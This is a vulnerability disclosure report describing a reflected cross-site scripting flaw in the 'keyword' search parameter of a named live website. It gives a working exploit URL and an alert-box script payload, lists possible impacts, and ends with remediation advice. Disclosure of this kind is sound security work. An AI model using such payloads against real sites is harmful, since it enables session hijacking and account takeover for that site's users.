# Reflected Cross-Site Scripting (XSS) via `keyword` Parameter


## Vulnerability Type

Reflected XSS


## Summary

The `keyword` parameter is reflected into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

An attacker can craft a malicious URL that executes JavaScript when visited by a victim.


## Vulnerable Endpoint

```http
https://www.probiologists.com/universal-search
```

### Vulnerable Parameter

```http
keyword
```

## Steps to Reproduce

1. Open the following URL:

```http
https://www.probiologists.com/universal-search?source=journals&keyword=xicorr%22%3E%3CScript%3Ealert(%22xicorr%22)%3C/script%3E
```

2. Observe that a JavaScript alert executes on page load.

## Payload Used

```html
xicorr"><Script>alert("xicorr")</script>
```

## Proof of Concept

The payload is reflected directly into the application response without sanitization, resulting in arbitrary JavaScript execution.

### Screenshot — Alert Popup Triggered

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/544cc7cd-014b-47e5-908c-b924defd3a6d" />


## Impact

An attacker can perform the following actions using this vulnerability:

* It allows attackers to hijack user sessions.
* It potentially leads to full account takeover.
* It allows attackers to perform unauthorized actions within the vulnerable application.
* It allows attackers to exfiltrate sensitive data.

## Recommendations for Fix

Validate and sanitize all user-supplied input before reflecting it into the response.

* Apply proper HTML output encoding before rendering user input
* Filter dangerous HTML tags such as `<script>`, `<svg>`, `<img>`
* Restrict execution of inline JavaScript
* Implement a strict Content Security Policy (CSP)
* Use a Web Application Firewall (WAF) to help detect and block malicious payloads
